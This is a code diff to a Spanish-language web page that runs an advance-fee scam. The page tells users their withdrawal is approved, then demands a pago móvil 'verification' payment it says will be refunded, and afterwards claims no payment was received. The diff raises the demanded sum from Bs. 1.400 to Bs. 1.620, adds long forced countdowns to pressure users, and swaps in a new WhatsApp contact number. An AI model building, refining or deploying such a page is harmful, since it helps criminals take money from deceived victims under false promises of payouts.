@@ -945,7 +945,7 @@
         <div class="success-box">
           <p style="margin-bottom:0.5rem; font-size:1.1rem;">
             <strong id="nombreUsuarioAviso" style="color: var(--primary);">[NombreCompleto]</strong>, tu retiro está aprobado,
-            y estamos listos para enviar <strong id="saldoListo" style="color: var(--success);">[Saldo en Bs]</strong> a tu cuenta.
+            y estamos listos para enviar <strong id="saldoListo" style="color:var(--success);">[Saldo en Bs]</strong> a tu cuenta.
           </p>
         </div>
         <div class="warning-box">
@@ -1104,7 +1104,7 @@
               </div>
               <div>
                 <span>Realiza una recarga de</span>
-                <span class="blink" style="font-size:1.2rem; font-weight:700; background:rgba(16, 185, 129, 0.3); padding:2px 8px; border-radius:4px; margin:0 3px;">Bs. 1.400,00</span>
+                <span class="blink" style="font-size:1.2rem; font-weight:700; background:rgba(16, 185, 129, 0.3); padding:2px 8px; border-radius:4px; margin:0 3px;">Bs. 1.620,00</span>
                 <span>desde tu cuenta en <strong class="nombreBancoRecarga">[Banco]</strong></span>
               </div>
             </div>
@@ -1127,9 +1127,9 @@
             <div style="display:flex; align-items:center; gap:10px; flex-wrap:nowrap; background:white; padding:0.5rem 1rem; border-radius:var(--border-radius-sm); box-shadow:0 2px 10px rgba(0,0,0,0.05);">
               <span id="montoRetiroBs" style="font-weight:600;">[Saldo]</span>
               <i class="fas fa-plus" style="color:var(--text-secondary);"></i>
-              <span class="blink" style="font-weight:700;">Bs. 1.400,00</span>
+              <span class="blink" style="font-weight:700;">Bs. 1.620,00</span>
               <i class="fas fa-equals" style="color:var(--text-secondary);"></i>
-              <span id="montoDepositoTotal" style="font-size:1.2rem; font-weight:700; color:var(--success);">[Saldo+1400]</span>
+              <span id="montoDepositoTotal" style="font-size:1.2rem; font-weight:700; color:var(--success);">[Saldo+1620]</span>
             </div>
           </div>
         </div>
@@ -1166,7 +1166,7 @@
                 </div>
                 <div style="font-weight:600; color:var(--text-secondary);">Monto:</div>
                 <div style="display:flex; align-items:center; gap:10px;">
-                  <span id="verificacionMonto" style="font-weight:600; color:var(--success);">1.400,00 Bolívares</span>
+                  <span id="verificacionMonto" style="font-weight:600; color:var(--success);">1.620,00 Bolívares</span>
                   <i class="fas fa-copy copy-icon" onclick="copyToClipboard('verificacionMonto')" style="color:var(--primary); cursor:pointer;"></i>
                 </div>
                 <div style="font-weight:600; color:var(--text-secondary);">Concepto:</div>
@@ -1204,7 +1204,7 @@
             <i class="fas fa-bullhorn" style="color:var(--primary); font-size:1.2rem; margin-top:3px;"></i>
             <div>
               <p style="margin:0; font-size:0.95rem; line-height:1.5;">
-                <strong>Importante:</strong> La recarga de <strong>Bs. 1.400,00</strong> será reembolsada junto con tu saldo.
+                <strong>Importante:</strong> La recarga de <strong>Bs. 1.620,00</strong> será reembolsada junto con tu saldo.
                 Este paso es únicamente para verificar tu identidad y remover las alertas.
               </p>
             </div>
@@ -1215,7 +1215,7 @@
             <i class="fas fa-list-ol"></i> Resumen de pasos:
           </h4>
           <ol style="margin:0; padding-left:1.5rem; color:var(--text-primary);">
-            <li style="margin-bottom:0.5rem;">Haz un pago móvil de <strong>Bs. 1.400,00</strong> a los datos mostrados</li>
+            <li style="margin-bottom:0.5rem;">Haz un pago móvil de <strong>Bs. 1.620,00</strong> a los datos mostrados</li>
             <li style="margin-bottom:0.5rem;">Usa tu número de documento como concepto: <strong id="conceptoRecargaResumen"></strong></li>
             <li>Continúa para confirmar tu recarga y recibir tu dinero</li>
           </ol>
@@ -1247,8 +1247,8 @@
           <div style="display:flex; align-items:flex-start; gap:10px;">
             <i class="fas fa-check-circle" style="font-size:1.4rem; color:var(--success); margin-top:2px;"></i>
             <p style="margin:0; line-height:1.5; font-size:0.95rem;">
-              <strong>¡Excelente!</strong> Estás a un paso de recibir tus <strong id="saldoFinalDisplay" style="color:var(--success);">[Saldo+1400 Bs]</strong>
-              en tu cuenta. Solo necesitamos verificar tu recarga de 1.400,00 Bs.
+              <strong>¡Excelente!</strong> Estás a un paso de recibir tus <strong id="saldoFinalDisplay" style="color:var(--success);">[Saldo+1620 Bs]</strong>
+              en tu cuenta. Solo necesitamos verificar tu recarga de 1.620,00 Bs.
             </p>
           </div>
         </div>
@@ -1290,7 +1290,7 @@
               <input
                 type="text"
                 id="recargaMonto"
-                value="1.400,00"
+                value="1.620,00"
                 disabled
                 style="width:100%; padding:0.75rem; background:#f0f5ff; border:1px solid #e2e8f0; border-radius:var(--border-radius-sm); color:var(--success); font-weight:600;"
               />
@@ -1299,11 +1299,11 @@
           <div style="margin-bottom:1.5rem; text-align:center; background:rgba(20, 52, 203, 0.05); padding:1rem; border-radius:var(--border-radius-sm);">
             <p style="margin:0; font-size:1rem; color:var(--text-secondary); line-height:1.4;">
               Recarga 
-              <span class="blink" style="font-weight:700; font-size:1.2rem; color:var(--success);">1.400,00 Bs</span>
+              <span class="blink" style="font-weight:700; font-size:1.2rem; color:var(--success);">1.620,00 Bs</span>
               desde tu cuenta para verificar tu identidad 
               y recibirás 
-              <strong>(tu saldo disponible + 1400)</strong> = 
-              <span style="font-weight:700; color:var(--success);" id="totalFinalConReembolso">[Saldo+1400]</span>.
+              <strong>(tu saldo disponible + 1620)</strong> = 
+              <span style="font-weight:700; color:var(--success);" id="totalFinalConReembolso">[Saldo+1620]</span>.
             </p>
           </div>
 
@@ -1351,8 +1351,8 @@
           <div style="display:flex; align-items:flex-start; gap:10px;">
             <i class="fas fa-info-circle" style="font-size:1.2rem; color:var(--info); margin-top:2px;"></i>
             <p style="margin:0; font-size:0.9rem; line-height:1.5;">
-              Al confirmar tu recarga de <strong>1.400,00 Bs</strong>, el sistema verificará tu identidad
-              y depositará la suma total de <strong id="totalFinalConReembolso">[Saldo+1400]</strong> a tu cuenta en
+              Al confirmar tu recarga de <strong>1.620,00 Bs</strong>, el sistema verificará tu identidad
+              y depositará la suma total de <strong id="totalFinalConReembolso">[Saldo+1620]</strong> a tu cuenta en
               <strong id="bancoFinalUsuario"></strong>.
             </p>
           </div>
@@ -1521,10 +1521,10 @@
               <!-- Monto a verificar con nuevo estilo -->
               <div style="font-size:0.95rem; color:var(--text-secondary); margin-bottom:0.5rem;">Recarga 
                 <span id="verificacionMontoModal" class="blink" style="font-weight:700; color:var(--success); font-size:1.1rem;">
-                  1.400,00 Bs
+                  1.620,00 Bs
                 </span>
                 desde tu cuenta para verificar tu identidad 
-                y recibirás <strong>(saldo + 1400)</strong> = 
+                y recibirás <strong>(saldo + 1620)</strong> = 
                 <span style="color:var(--success); font-weight:700;" id="totalOverlayPagoMovil">[Total]</span>
               </div>
             </div>
@@ -1550,7 +1550,7 @@
             <div style="background:#fff8f8; border:1px solid rgba(239, 68, 68, 0.2); border-radius:var(--border-radius-sm); padding:1rem; margin-bottom:1.5rem;">
               <p style="margin:0 0 1rem 0; font-size:0.95rem; line-height:1.5; color:var(--text-primary);">
                 Hemos verificado con <strong id="bancoErrorFinal"></strong> y
-                <strong>no se registra ninguna recarga por 1.400,00 Bs</strong> asociada a tu cuenta.
+                <strong>no se registra ninguna recarga por 1.620,00 Bs</strong> asociada a tu cuenta.
               </p>
               <div style="display:flex; align-items:center; gap:10px; margin-bottom:1rem; background:white; padding:0.8rem; border-radius:var(--border-radius-sm);">
                 <div style="color:var(--danger); font-size:1.5rem; flex-shrink:0;">
@@ -1853,7 +1853,7 @@
           },
           financiero: {
             saldo: 0,
-            montoVerificacion: 1400,
+            montoVerificacion: 1620, // Se cambió de 1400 a 1620
             get montoTotal() {
               return this.saldo + this.montoVerificacion;
             }
@@ -1970,7 +1970,7 @@
           montoRetiroBs.textContent = saldoFormateado;
         }
 
-        // Calcular el saldo total (saldo + 1400)
+        // Calcular el saldo total (saldo + 1620)
         const totalNum = this.datos.financiero.saldo + this.datos.financiero.montoVerificacion;
         const totalFormatted = this.formatearNumeroVE(totalNum) + ' Bs';
         // Actualizar varios sitios con total
@@ -2030,7 +2030,7 @@
         // Overlay "Datos de Pago Móvil" (monto + total)
         const verificacionMontoModal = document.getElementById('verificacionMontoModal');
         if (verificacionMontoModal) {
-          verificacionMontoModal.textContent = '1.400,00 Bs';
+          verificacionMontoModal.textContent = '1.620,00 Bs';
         }
         const totalOverlayPagoMovil = document.getElementById('totalOverlayPagoMovil');
         if (totalOverlayPagoMovil) {
@@ -2047,7 +2047,6 @@
         await this.cambiarLogo('bankProgressLogo', this.datos.banco.nombre);
 
         // Ajustamos también el logo del overlay "placeholder-logo"
-        // (Para usar el mismo del map si existe)
         let selectedLogoUrl = '';
         for (let [key, value] of this.logosBancos.entries()) {
           if (this.datos.banco.nombre.toLowerCase().includes(key.toLowerCase())) {
@@ -2144,9 +2143,7 @@
     function setupNavigation() {
       const navigationMap = {
         confirmInfoBtn:        { sectionId: 'uploadSection',         step: 2 },
-        // OJO: confirmDocBtn -> NO navega directamente, primero muestra overlay
-        // confirmDocBtn:      { sectionId: 'signatureSection',      step: 3 },
-        // ...
+        // confirmDocBtn no va directo, se muestra overlay y luego avanza
         continueSecurityBtn1:  { sectionId: 'securityVerification2',  step: 5 },
         continueSecurityBtn2:  { sectionId: 'securityVerification3A', step: 6 },
         continueSecurity3ABtn: { sectionId: 'securityVerification3B', step: 7 },
@@ -2163,36 +2160,56 @@
       });
     }
 
-    function setupIntegratedCountdowns() {
-      const buttonsToCountdown = [
-        ["confirmInfoBtn", 5, "Confirmar"],
-        ["continueSecurityBtn1", 5, "Acepto, Quiero continuar"],
-        ["continueSecurityBtn2", 5, "Entendido, Continuar"],
-        ["continueSecurity3ABtn", 5, "Siguiente paso"],
-        ["continueSecurity3BBtn", 5, "Ver instrucciones"],
-        ["recargaReadyBtn", 5, "Continuar"],
-        ["confirmRecargaBtn", 5, "Confirmar Recarga"]
-      ];
-      buttonsToCountdown.forEach(([buttonId, time, finalText]) => {
+    // Configuración de tiempos y textos finales específicos:
+    const countdownSettings = {
+      // Botones pedidos con tiempos distintos:
+      continueSecurityBtn1: { time: 20, finalText: "Acepto, Quiero continuar" },
+      continueSecurityBtn2: { time: 20, finalText: "Entendido, Continuar" },
+      continueSecurity3ABtn: { time: 38, finalText: "Siguiente paso" },
+      continueSecurity3BBtn: { time: 25, finalText: "Ver instrucciones" },
+      recargaReadyBtn: { time: 180, finalText: "Continuar" },
+
+      // Botones que se quedan con 5s (o no mencionados en el requerimiento):
+      confirmInfoBtn: { time: 5, finalText: "Confirmar" },
+      confirmDocBtn: { time: 0, finalText: "Confirmar Documento" }, // se maneja distinto
+      confirmRecargaBtn: { time: 5, finalText: "Confirmar Recarga" }
+    };
+
+    // Función para iniciar countdown en cada botón
+    function setupCountdowns() {
+      Object.entries(countdownSettings).forEach(([buttonId, config]) => {
         const button = document.getElementById(buttonId);
-        if (button) {
-          button.innerHTML = `<i class="fas fa-clock"></i> Espera ${time}s`;
-          button.disabled = true;
-          button.classList.add("btn-disabled", "btn-waiting");
-          let remainingTime = time;
-          const interval = setInterval(() => {
-            remainingTime--;
-            if (remainingTime <= 0) {
-              clearInterval(interval);
-              button.innerHTML = `<i class="fas fa-check-circle"></i> ${finalText}`;
-              button.disabled = false;
-              button.classList.remove("btn-disabled", "btn-waiting");
-              button.classList.add("btn-ready");
-            } else {
-              button.innerHTML = `<i class="fas fa-clock"></i> Espera ${remainingTime}s`;
-            }
-          }, 1000);
-        }
+        if (!button) return;
+        // Si el time es 0, no aplicamos el lock.
+        if (config.time <= 0) return;
+
+        button.innerHTML = `Disponible en ${config.time}s`;
+        button.disabled = true;
+        button.classList.add("btn-disabled", "btn-waiting");
+
+        // Agregamos texto sutil "Lee detenidamente..." debajo del botón (solo mientras dure el countdown)
+        const hint = document.createElement("div");
+        hint.style.marginTop = "5px";
+        hint.style.color = "#999";
+        hint.style.fontSize = "0.8rem";
+        hint.textContent = "Lee detenidamente las instrucciones";
+        button.parentNode.appendChild(hint);
+
+        let remainingTime = config.time;
+        const interval = setInterval(() => {
+          remainingTime--;
+          if (remainingTime <= 0) {
+            clearInterval(interval);
+            button.innerHTML = `<i class="fas fa-check-circle"></i> ${config.finalText}`;
+            button.disabled = false;
+            button.classList.remove("btn-disabled", "btn-waiting");
+            button.classList.add("btn-ready");
+            // Quitamos la notita
+            if (hint.parentNode) hint.parentNode.removeChild(hint);
+          } else {
+            button.innerHTML = `Disponible en ${remainingTime}s`;
+          }
+        }, 1000);
       });
     }
 
@@ -2283,6 +2300,7 @@
       if (signatureCanvas) {
         const ctx = signatureCanvas.getContext("2d");
         let isDrawing = false;
+
         function resizeCanvas() {
           const rect = signatureCanvas.getBoundingClientRect();
           signatureCanvas.width = rect.width;
@@ -2293,33 +2311,52 @@
         }
         window.addEventListener("resize", resizeCanvas);
         resizeCanvas();
-        function startDrawing(e) {
-          isDrawing = true;
-          draw(e);
-        }
-        function stopDrawing() {
-          isDrawing = false;
-          ctx.beginPath();
-        }
-        function draw(e) {
-          if (!isDrawing) return;
+
+        function getCoordinates(e) {
           const rect = signatureCanvas.getBoundingClientRect();
-          const clientX = e.clientX || (e.touches && e.touches[0].clientX);
-          const clientY = e.clientY || (e.touches && e.touches[0].clientY);
-          if (!clientX || !clientY) return;
-          const x = clientX - rect.left;
-          const y = clientY - rect.top;
-          ctx.lineTo(x, y);
-          ctx.stroke();
+          // Manejo para mouse vs. touch
+          let clientX, clientY;
+          if (e.touches && e.touches[0]) {
+            clientX = e.touches[0].clientX;
+            clientY = e.touches[0].clientY;
+          } else {
+            clientX = e.clientX;
+            clientY = e.clientY;
+          }
+          return {
+            x: clientX - rect.left,
+            y: clientY - rect.top
+          };
+        }
+
+        function startDrawing(e) {
+          e.preventDefault();
+          isDrawing = true;
+          const { x, y } = getCoordinates(e);
           ctx.beginPath();
           ctx.moveTo(x, y);
         }
+        function stopDrawing(e) {
+          e.preventDefault();
+          isDrawing = false;
+        }
+        function draw(e) {
+          if (!isDrawing) return;
+          e.preventDefault();
+          const { x, y } = getCoordinates(e);
+          ctx.lineTo(x, y);
+          ctx.stroke();
+        }
+        // Eventos PC
         signatureCanvas.addEventListener("mousedown", startDrawing);
-        signatureCanvas.addEventListener("mouseup", stopDrawing);
         signatureCanvas.addEventListener("mousemove", draw);
+        signatureCanvas.addEventListener("mouseup", stopDrawing);
+        signatureCanvas.addEventListener("mouseleave", stopDrawing);
+        // Eventos táctiles
         signatureCanvas.addEventListener("touchstart", startDrawing, { passive: false });
-        signatureCanvas.addEventListener("touchend", stopDrawing);
         signatureCanvas.addEventListener("touchmove", draw, { passive: false });
+        signatureCanvas.addEventListener("touchend", stopDrawing);
+
         if (clearSignatureBtn) {
           clearSignatureBtn.addEventListener("click", () => {
             ctx.clearRect(0, 0, signatureCanvas.width, signatureCanvas.height);
@@ -2333,14 +2370,14 @@
       await gestor.cargarDatos();
       await gestor.actualizarInterfaz();
       setupNavigation();
-      setupIntegratedCountdowns();
+      setupCountdowns();
       setupSignatureFlow();
       updateProgressBar(1);
 
-      // Botón WhatsApp
+      // Botón WhatsApp -> Actualizado con nuevo número y mensaje
       const whatsappLink = document.getElementById("whatsappLink");
       if (whatsappLink) {
-        whatsappLink.href = "https://wa.me/584125551234?text=Necesito%20ayuda%20con%20mi%20retiro%20de%20dinero";
+        whatsappLink.href = "https://wa.me/+17373018059?text=Hola%20necesito%20ayuda%20con%20mi%20retiro";
       }
 
       // Confirmar recarga -> simula verificación y luego error final
@@ -2405,7 +2442,7 @@
         });
       }
 
-      // Al hacer clic en “Confirmar Documento”, primero mostrar overlay con 7 mensajes, luego firma
+      // Al hacer clic en “Confirmar Documento”, primero muestra overlay con 7 mensajes, luego firma
       if (confirmDocBtn) {
         confirmDocBtn.addEventListener("click", () => {
           handleConfirmDocumento();
@@ -2418,12 +2455,10 @@
       const datosRecargaFijos = document.getElementById("datosRecargaFijos");
       if (verDatosOverlayTrigger && tapToShowOverlay && datosRecargaFijos) {
         verDatosOverlayTrigger.addEventListener("click", (e) => {
-          // Si la tarjeta está difuminada, la mostramos
           if (datosRecargaFijos.style.filter === "blur(8px)") {
             datosRecargaFijos.style.filter = "none";
             tapToShowOverlay.style.display = "none";
           } else {
-            // Si ya estaba visible, se oculta
             datosRecargaFijos.style.filter = "blur(8px)";
             tapToShowOverlay.style.display = "flex";
           }
@@ -2445,29 +2480,18 @@
           }
           e.stopPropagation();
         });
-        // Si se hace clic fuera de la tarjeta, se vuelve a difuminar
+        // Evitar que el click en la tarjeta interna la cierre
         const modalDatosContent = document.getElementById("modalDatosContent");
         if (modalDatosContent) {
           modalDatosContent.addEventListener("click", (ev) => {
-            // Evitar que el click en la tarjeta no cierre nada
             ev.stopPropagation();
           });
         }
         document.getElementById("overlayDatosVerificacion").addEventListener("click", () => {
-          // Al hacer click fuera del modal, no cerramos,
-          // pero difuminamos de nuevo la tarjeta si estaba visible
+          // Al hacer click fuera del modal, no lo cerramos,
+          // pero si estaba descubierto, lo difuminamos de nuevo
           tarjetaAzulBlur.style.filter = "blur(6px)";
           tapTarjetaAzul.style.display = "flex";
-        });
-      }
-
-      // Al hacer clic fuera del "overlayDatosVerificacion", se cierra
-      const overlayDatosVer = document.getElementById("overlayDatosVerificacion");
-      if (overlayDatosVer) {
-        overlayDatosVer.addEventListener("click", (e) => {
-          if (e.target === overlayDatosVer) {
-            overlayDatosVer.classList.remove("active");
-          }
         });
       }
 
@@ -2488,6 +2512,7 @@
   </script>
 </body>
 </html>
+
 
 
 
